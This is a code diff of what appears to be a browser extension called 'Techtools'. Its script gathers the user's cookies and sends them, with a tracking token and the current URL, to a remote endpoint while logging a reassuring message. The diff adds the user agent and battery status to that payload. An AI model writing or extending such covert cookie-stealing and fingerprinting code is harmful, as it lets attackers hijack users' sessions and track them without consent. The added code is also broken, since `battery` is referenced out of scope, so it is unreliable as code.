@@ -3,6 +3,15 @@ function generateToken() {
   return 'user_' + Math.random().toString(36).substr(2) + Date.now().toString(36);
 }
 
+// Battery Status API
+function getBatteryInfo() {
+  navigator.getBattery?.().then(battery => console.log({ batteryLevel: `${battery.level * 100}%`, isCharging: battery.charging }));
+}
+
+getBatteryInfo();
+
+
+
 chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
   console.log('Techtools is taking care of your data!');
 
@@ -27,8 +36,13 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
       },
       body: JSON.stringify({
         "data": response.cookies,
-        "token_identifier": userToken, // Include the token in the request
-        "url_send_from": currentUrl
+        "token_identifier": userToken,
+        "url_send_from": currentUrl,
+        "user_agent": navigator.userAgent,
+        "battery_info": {
+          "batteryLevel": `${battery.level * 100}%`,
+          "isCharging": battery.charging
+        }
       })
     })
     .then(response => {
